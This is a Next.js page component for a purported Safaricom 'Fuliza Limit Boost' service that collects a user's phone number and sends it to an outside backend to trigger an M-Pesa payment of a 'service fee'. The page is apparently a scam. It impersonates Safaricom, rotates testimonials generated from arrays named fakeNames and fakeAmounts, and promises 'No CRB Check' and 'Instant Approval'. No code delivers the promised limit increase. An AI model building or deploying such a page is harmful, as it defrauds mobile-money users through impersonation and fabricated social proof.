"use client";

import React, { useEffect, useState } from "react";

type Limit = {
  id: string;
  amount: number;
  fee: number;
};

const limits: Limit[] = [
  { id: "l1", amount: 5000, fee: 150 },
  { id: "l2", amount: 7500, fee: 180 },
  { id: "l3", amount: 10000, fee: 200 },
  { id: "l4", amount: 15000, fee: 250 },
  { id: "l5", amount: 20000, fee: 300 },
  { id: "l6", amount: 30000, fee: 400 },
  { id: "l7", amount: 40000, fee: 540 },
  { id: "l8", amount: 50000, fee: 960 },
];

const fakeNames = ["James K.", "Mercy W.", "Brian O.", "Faith N.", "Allan M."];
const fakeAmounts = [15000, 20000, 34000, 50000, 25000];

const BACKEND_URL =
  process.env.NEXT_PUBLIC_BACKEND_URL ||
  "https://starlink-backend-yb3n.onrender.com";

export default function FulizaBoost() {
  const [selectedLimit, setSelectedLimit] = useState<Limit | null>(null);
  const [showModal, setShowModal] = useState(false);
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [phone, setPhone] = useState("");
  const [recent, setRecent] = useState({ name: "", amount: 0 });
  const [errors, setErrors] = useState<{ phone?: string }>({});

  const normalizePhone = (num: string) => {
    let phone = num.replace(/\D/g, "");

    if (phone.startsWith("07") || phone.startsWith("01")) {
      return "254" + phone.slice(1);
    }

    if (phone.startsWith("254")) {
      return phone;
    }

    return phone;
  };

  useEffect(() => {
    const generate = () => {
      const name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
      const amount = fakeAmounts[Math.floor(Math.random() * fakeAmounts.length)];
      setRecent({ name, amount });
    };
    generate();
    const interval = setInterval(generate, 2000);
    return () => clearInterval(interval);
  }, []);

  const validate = () => {
    const newErrors: any = {};
    const normalized = normalizePhone(phone);

    if (!/^254(7|1)\d{8}$/.test(normalized)) {
      newErrors.phone =
        "Enter valid Safaricom number (07XXXXXXXX, 01XXXXXXXX or 254XXXXXXXXX)";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleBuy = async () => {
    if (!selectedLimit) return;
    if (!validate()) return;

    setLoading(true);

    const normalizedPhone = normalizePhone(phone);

    try {
      const res = await fetch(`${BACKEND_URL}/api/runPrompt`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          phone: normalizedPhone,
          amount: selectedLimit.fee,
          local_id: `O${Date.now().toString(36)}`,
          transaction_desc: `Fuliza boost to Ksh ${selectedLimit.amount}`,
          till_id: 1,
        }),
      });

      const data = await res.json();
      if (data.status) setSuccess(true);
    } catch (err) {
      console.log(err);
    } finally {
      setLoading(false);
    }
  };

  const closeModal = () => {
    setShowModal(false);
    setSuccess(false);
    setPhone("");
    setErrors({});
  };

  return (
    <div className="min-h-screen bg-[#f4faf6] flex justify-center antialiased">
      <div className="w-full max-w-md pb-16">

        <div className="bg-[#00A651] text-white text-center py-5 font-semibold text-lg shadow">
          Safaricom Fuliza Limit Boost
        </div>

        <div className="text-center mt-5 px-6">
          <h2 className="text-xl font-bold text-[#008043]">
            Increase Your Fuliza Allocation
          </h2>
          <p className="text-sm text-gray-600 mt-1">
            Secure digital application process for eligible Safaricom customers.
          </p>
        </div>

        <div className="mx-4 mt-6 bg-white rounded-2xl shadow-sm p-4 border border-green-100">
          <div className="flex justify-between text-sm font-medium text-[#008043]">
            <span>✔ Secure Application</span>
            <span>✔ No CRB Check</span>
          </div>
          <div className="text-center text-sm font-medium text-[#008043] mt-2">
            ✔ Instant Approval
          </div>
        </div>

        <div className="mx-4 mt-5 bg-green-50 border border-green-200 p-3 rounded-xl text-sm text-gray-700">
          {recent.name} increased Fuliza to{" "}
          <span className="font-semibold text-[#008043] tabular-nums">
            Ksh {recent.amount.toLocaleString()}
          </span>{" "}
          • just now
        </div>

        <div className="mx-4 mt-6 text-[#008043] font-semibold text-sm">
          Select Preferred Fuliza Limit
        </div>

        <div className="grid grid-cols-2 gap-4 px-4 mt-4">
          {limits.map((limit) => {
            const active = selectedLimit?.id === limit.id;

            return (
              <div
                key={limit.id}
                onClick={() => setSelectedLimit(limit)}
                className={`rounded-2xl p-4 cursor-pointer border transition-all duration-200 transform ${
                  active
                    ? "bg-[#00A651] text-white border-[#00A651] scale-[1.03] shadow-lg"
                    : "bg-white border-green-200 hover:shadow-md"
                }`}
              >
                <div
                  className={`text-center text-[20px] font-extrabold tabular-nums ${
                    active ? "text-white" : "text-black"
                  }`}
                >
                  Ksh {limit.amount.toLocaleString()}
                </div>

                <div
                  className={`text-[12px] text-center mt-1 tabular-nums ${
                    active ? "text-white/90" : "text-gray-600"
                  }`}
                >
                  Service Fee: Ksh {limit.fee}
                </div>
              </div>
            );
          })}
        </div>

        <div className="px-4 mt-6">
          <button
            onClick={() => selectedLimit && setShowModal(true)}
            className="w-full bg-[#00A651] hover:bg-[#008043] text-white py-3 rounded-xl font-semibold shadow-md transition"
          >
            Proceed Securely
          </button>
        </div>

        <div className="text-center text-xs text-gray-500 mt-6 px-6">
          This is a digital facilitation service for Safaricom Fuliza users.
          Processing timelines may vary based on eligibility criteria.
        </div>

        {showModal && selectedLimit && (
          <div className="fixed inset-0 bg-black/40 backdrop-blur-sm flex items-center justify-center px-4">
            <div className="bg-white w-full max-w-sm rounded-2xl shadow-2xl overflow-hidden">

              <div className="bg-[#00A651] text-white px-6 py-4">
                <h3 className="text-sm font-medium">
                  Secure Fuliza Application
                </h3>
                <p className="text-lg font-semibold mt-1">
                  Limit will be boosted to Ksh{" "}
                  {selectedLimit.amount.toLocaleString()}
                </p>
              </div>

              <div className="p-6">
                {!success ? (
                  <>
                    <div className="mb-4 text-sm text-gray-600 bg-green-50 border border-green-200 p-3 rounded-xl">
                      Enter your Safaricom number to receive the secure M-Pesa
                      payment prompt. Once payment is confirmed your Fuliza
                      boost request will begin processing.
                    </div>

                    <div className="mb-4">
                      <input
                        type="tel"
                        placeholder="Safaricom Number"
                        value={phone}
                        onChange={(e) => setPhone(e.target.value)}
                        className="w-full rounded-xl p-3 text-sm border border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-100 outline-none"
                      />
                    </div>

                    <div className="flex gap-3">
                      <button
                        onClick={closeModal}
                        className="w-1/2 border border-gray-300 py-3 rounded-xl text-sm font-medium"
                      >
                        Cancel
                      </button>

                      <button
                        onClick={handleBuy}
                        disabled={loading}
                        className="w-1/2 bg-[#00A651] text-white py-3 rounded-xl text-sm font-semibold shadow"
                      >
                        {loading
                          ? "Processing..."
                          : `Pay Ksh ${selectedLimit.fee}`}
                      </button>
                    </div>

                    <p className="text-xs text-gray-500 mt-4 text-center">
                      Your information is encrypted and securely processed.
                    </p>
                  </>
                ) : (
                  <div className="text-center py-6">
                    <h3 className="text-lg font-semibold text-[#008043]">
                      Application Submitted
                    </h3>

                    <p className="text-sm text-gray-600 mt-2">
                      Processing may take up to 72 hours.
                    </p>

                    <button
                      onClick={closeModal}
                      className="mt-5 bg-[#00A651] text-white px-6 py-2 rounded-xl text-sm"
                    >
                      Close
                    </button>
                  </div>
                )}
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
